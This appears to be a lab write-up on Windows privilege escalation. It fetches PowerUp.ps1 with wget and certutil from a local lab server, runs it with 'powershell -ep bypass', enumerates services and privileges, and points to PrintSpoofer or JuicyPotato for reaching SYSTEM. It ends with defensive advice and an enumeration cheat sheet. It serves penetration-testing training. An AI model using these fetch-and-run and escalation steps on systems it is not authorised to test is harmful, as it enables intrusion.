<img width="1390" height="739" alt="image" src="https://github.com/user-attachments/assets/eeda5c18-2bf8-49e8-9f45-ea78a081e388" />

<img width="1728" height="703" alt="image" src="https://github.com/user-attachments/assets/2284427e-948f-46b6-83b3-5d6bd1dcb401" />

<img width="997" height="691" alt="image" src="https://github.com/user-attachments/assets/761135f3-99e6-4917-a1e1-af064c1a043a" />

<img width="1742" height="788" alt="image" src="https://github.com/user-attachments/assets/1c9a1933-b08e-49e0-9943-b0f64a39bd6c" />

<img width="775" height="260" alt="image" src="https://github.com/user-attachments/assets/0bbb3658-ff08-4df4-af0b-f6c1b0e44c57" />

- Now we can view all target infomation.


---




### 2. PowerUp.ps1
- On kali I want to create one folder:
````
mkdir -p ~/privesc && cd ~/privesc
````
<img width="428" height="116" alt="image" src="https://github.com/user-attachments/assets/e0df0caf-107c-4187-a515-038eaeecc881" />


#### Download PowerUP.ps1 
````
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
````
<img width="1886" height="365" alt="image" src="https://github.com/user-attachments/assets/cce37b69-c5fe-4602-9911-b14a52f78c41" />


#### Server the File via HTTP 
- Start a python HTTP server
````
python3 -m http.server 8080
````
<img width="585" height="154" alt="image" src="https://github.com/user-attachments/assets/d525f147-290c-4512-9d76-33ff74d531bf" />


#### On Windows

##### Save to disk
````
certutil -urlcache -f http://192.168.127.128:8080/PowerUp.ps1 PowerUp.ps1
````
<img width="747" height="96" alt="image" src="https://github.com/user-attachments/assets/076d11ec-955d-44ea-85da-5d31e9281df5" />

- Now we got successful to download it.

##### Run Powershell:
````
powershell -ep bypass
````
<img width="610" height="154" alt="image" src="https://github.com/user-attachments/assets/136678b4-b40e-49ed-b4ee-a6f5f5b566a1" />

````
Import-Module .\PowerUp.ps1
````
<img width="418" height="76" alt="image" src="https://github.com/user-attachments/assets/8507cc9f-61cf-47db-8a88-c726cfc73943" />


````
Invoke-AllChecks
````
<img width="409" height="73" alt="image" src="https://github.com/user-attachments/assets/1b92e81b-a79b-475c-b4f1-c5af161f1ba3" />





<img width="460" height="775" alt="image" src="https://github.com/user-attachments/assets/76be7249-00cd-490a-b66f-f02f952c61a6" />



<img width="366" height="521" alt="image" src="https://github.com/user-attachments/assets/c4e1530b-fef6-4e78-94e5-e7a77e025433" />




##### Next step:
Pick one modifiable service
````
sc query
````

<img width="689" height="685" alt="image" src="https://github.com/user-attachments/assets/d7057568-54d6-49d8-a438-c53b62468959" />


- Check specific service:
````
sc.exe qc dhcp
````
<img width="821" height="265" alt="image" src="https://github.com/user-attachments/assets/1cabd701-b596-4c65-9a87-ad240877312d" />

##### What this means for privilege escalation
- This is not exploitable in the way “Modifiable Service Files” findings are.
- The binary (`svchost.exe`) is a core Windows system file, protected by Windows File Protection.
- Even if you had write access (you don’t), replacing `svchost.exe` would break the system.
- Because it runs as LocalService, it doesn’t give you SYSTEM privileges anyway.


````
Invoke-AllChecks
````
<img width="454" height="800" alt="image" src="https://github.com/user-attachments/assets/e4f87b41-fa01-448c-af67-2de968179c4a" />


- Check privileges 
````
whoami /priv
````
<img width="997" height="551" alt="image" src="https://github.com/user-attachments/assets/39e5403b-77eb-421c-b77a-7927dc651954" />

- Now we have three critical privileges enabled:
````
SeDebugPrivilege          → Enabled  
SeChangeNotifyPrivilege   → Enabled  
SeImpersonatePrivilege    → Enabled  ✅
````
- This our golden ticket:
``SeImpersonatePrivilege`` is enabled → You can escalate to `NT AUTHORITY\SYSTEM` using tools like PrintSpoofer or JuicyPotato.

---






## 8. Final Note:

### Defensive Measure

#### Principles of Least Privilege
  - Run services with minimal required privileges
  - Use service accounts instead of SYSTEM/LocalService
#### Regular Auditing:
- Audit file permissions
````
Get-ChildItem -Path "C:\Program Files\" -Recurse | Get-Acl | Where-Object {$_.AccessToString -match "Everyone"}
````
- Audit services
````
Get-WmiObject win32_service | Select-Object Name, StartName, PathName
````
#### Secure Configuration
- Use quoted service paths
- Set strong permissions on executables
- Regular patch management
- Disable unnecessary privileges

#### Monitoring
- Monitor for privilege escalation attempts
- Log service changes
- Audit scheduled task creation


---






## 9. Cheat Sheet

### Basic Enumeration

| Command                                                 | What it Shows                                         | Why It Matters                                             |
| ------------------------------------------------------- | ----------------------------------------------------- | ---------------------------------------------------------- |
| `whoami /all`                                           | Current user, groups, privileges, and integrity level | Helps understand **what access the account really has**    |
| `systeminfo \| findstr /B /C:"OS Name" /C:"OS Version"` | Windows name & version                                | OS version helps determine **patch level & compatibility** |
| `net user %username%`                                   | Details about the logged-in user                      | Shows password policies, account status                    |
| `net localgroup administrators`                         | Members of local Administrators group                 | Confirms **who has admin rights**                          |



### Permission Checks
| Command                                                            | What it Checks              | Why It Matters                                    |
| ------------------------------------------------------------------ | --------------------------- | ------------------------------------------------- |
| `icacls "C:\Program Files\*" 2>nul \| findstr "(F) (M) (W)"`       | Write/modify permissions    | Writable system folders can be **security risks** |
| `icacls "C:\Program Files (x86)\*" 2>nul \| findstr "(F) (M) (W)"` | Same as above (32-bit apps) | Helps spot **misconfigured access control**       |

- Permission flags:
  - `(F)` = Full control
  - `(M)` = Modify
  - `(W)` = Write


### Service Enumeration
| Command                                                                              | What it Shows        | Why It Matters                                      |
| ------------------------------------------------------------------------------------ | -------------------- | --------------------------------------------------- |
| `wmic service get name,displayname,startmode,pathname \| findstr /i /v "c:\windows"` | Non-Windows services | Third-party services often have **weaker security** |
| `sc query state= all \| findstr "SERVICE_NAME"`                                      | All service names    | Helps build a **service inventory**                 |



### Scheduled Tasks
| Command                                                     | Purpose                       |
| ----------------------------------------------------------- | ----------------------------- |
| `schtasks /query /fo TABLE /nh /v \| findstr /v "Disabled"` | Lists enabled scheduled tasks |

> Used to identify automatic processes running with elevated permissions.


---



<h2 align="center"> Finished of Permissions </h2>


<h2 align="center"> Credit By: Nin Kanong (k4n0ng) </h2>


<h3 align="center"> Date: 29/12/2025 </h3>
